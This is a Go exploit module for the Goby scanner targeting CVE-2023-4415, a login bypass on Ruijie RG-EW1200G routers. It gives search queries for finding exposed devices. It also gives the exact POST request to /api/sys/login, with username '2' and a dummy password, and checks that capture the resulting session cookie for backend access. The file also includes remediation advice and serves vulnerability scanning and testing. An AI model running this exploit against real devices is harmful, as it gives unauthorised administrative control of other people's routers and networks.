package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Ruijie RG-EW1200G /api/sys/login Permission Bypass Vulnerability (CVE-2023-4415)",
    "Description": "<p>Ruijie RG-EW1200G is a router device</p><p>Ruijie RG-EW1200G has a login bypass vulnerability, which allows attackers to change the username in the request packet to 2, achieve login bypass, log in to the background, and proceed to the next attack step</p>",
    "Product": "Ruijie RG-EW1200G",
    "Homepage": "www.ruijie.com.cn",
    "DisclosureDate": "2024-04-16",
    "PostTime": "2024-04-16",
    "Author": "lidingke@baimaohui.net",
    "FofaQuery": "title==\"锐捷网络\" && body=\"DEFAULT_VERSION = 8.0\"",
    "GobyQuery": "title==\"锐捷网络\" && body=\"DEFAULT_VERSION = 8.0\"",
    "Level": "2",
    "Impact": "<p>Ruijie RG-EW1200G has a login bypass vulnerability, which allows attackers to change the username in the request packet to 2, achieve login bypass, log in to the background, and proceed to the next attack step</p>",
    "Recommendation": "<p>Perform multiple authentication methods for user login interfaces, such as token tokens, SMS verification codes, and combining multiple parameters for authentication.</p><p>Strictly verify the user login request submitted by the client, and perform bidirectional verification between the server and client for the corresponding user identity and the current logged in user identity, to determine whether the user has the right to log in.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/api/sys/login",
                "follow_redirect": false,
                "header": {
                    "Accept": "application/json, text/plain, */*",
                    "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                    "Accept-Encoding": "gzip, deflate",
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "{\"username\":\"2\",\"password\":\"123123123\",\"timestamp\":1713231783000}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "bcrsession",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "\"result\":\"ok\"",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "keymemo|lastbody|variable|/api/sys/login",
                "vulurl|lastbody|variable|{{{fixedhostinfo}}}/api/sys/login"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/api/sys/login",
                "follow_redirect": false,
                "header": {
                    "Accept": "application/json, text/plain, */*",
                    "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                    "Accept-Encoding": "gzip, deflate",
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "{\"username\":\"2\",\"password\":\"123123123\",\"timestamp\":1713231783000}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "bcrsession",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "\"result\":\"ok\"",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastheader|regex|([\\s\\S]*)"
            ]
        }
    ],
    "Tags": [
        "Permission Bypass"
    ],
    "VulType": [
        "Permission Bypass"
    ],
    "CVEIDs": [
        "CVE-2023-4415"
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.3",
    "Translation": {
        "CN": {
            "Name": "锐捷RG-EW1200G /api/sys/login 权限绕过漏洞 (CVE-2023-4415)",
            "Product": "锐捷RG-EW1200G",
            "Description": "<p>锐捷RG-EW1200G是一款路由器设备<br>锐捷RG-EW1200G存在登录绕过漏洞，攻击者可将请求包中username改为2，实现登录绕过，登录到后台，从而进行下一步攻击<br></p>",
            "Recommendation": "<p>对用户登录接⼝进行多重身份验证，如token令牌，短信验证码，多个参数结合认证等方式。</p><p>严格校验客户端提交的用户登录请求，对应请求的用户身份和当前登录的用户身份进行服务端与客户端双向校验，判断是否有权登录用户。<br><br></p>",
            "Impact": "<p>锐捷RG-EW1200G存在登录绕过漏洞，攻击者可将请求包中username改为2，实现登录绕过，登录到后台，从而进行下一步攻击<br></p>",
            "VulType": [
                "权限绕过"
            ],
            "Tags": [
                "权限绕过"
            ]
        },
        "EN": {
            "Name": "Ruijie RG-EW1200G /api/sys/login Permission Bypass Vulnerability (CVE-2023-4415)",
            "Product": "Ruijie RG-EW1200G",
            "Description": "<p>Ruijie RG-EW1200G is a router device</p><p>Ruijie RG-EW1200G has a login bypass vulnerability, which allows attackers to change the username in the request packet to 2, achieve login bypass, log in to the background, and proceed to the next attack step</p>",
            "Recommendation": "<p>Perform multiple authentication methods for user login interfaces, such as token tokens, SMS verification codes, and combining multiple parameters for authentication.</p><p>Strictly verify the user login request submitted by the client, and perform bidirectional verification between the server and client for the corresponding user identity and the current logged in user identity, to determine whether the user has the right to log in.</p>",
            "Impact": "<p>Ruijie RG-EW1200G has a login bypass vulnerability, which allows attackers to change the username in the request packet to 2, achieve login bypass, log in to the background, and proceed to the next attack step<br></p>",
            "VulType": [
                "Permission Bypass"
            ],
            "Tags": [
                "Permission Bypass"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10942"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
